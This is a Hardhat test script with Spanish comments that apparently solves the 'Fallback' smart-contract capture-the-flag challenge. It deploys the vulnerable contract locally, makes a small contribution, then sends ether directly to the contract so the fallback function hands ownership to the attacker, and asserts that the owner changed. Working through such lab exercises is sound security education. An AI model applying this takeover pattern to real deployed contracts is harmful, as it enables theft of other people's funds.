const { expect } = require("chai");
const { ethers } = require("hardhat");

/**
Consigue ser el owner del contrato
Reduces su saldo a 0
 */

describe("Fallback", function () {
  before("Deploy", async function () {
    [this.contrato, this.attack] = await hre.ethers.getSigners();
    const Fallback = await ethers.getContractFactory("Fallback");
    this.fall = await Fallback.deploy();
    await this.fall.deployed();

    this.c_otro = await this.fall.connect(this.attack);
  });

  it("Ataque", async function() {
    const owner = await this.fall.owner();

    await this.c_otro.contribute({ value: ethers.utils.parseEther("0.0001") })
    await this.attack.sendTransaction({ to: this.fall.address, value: ethers.utils.parseEther("0.0001"), });

    const owner2 = await this.fall.owner();

    expect(owner).to.not.equal(owner2);
  });

});
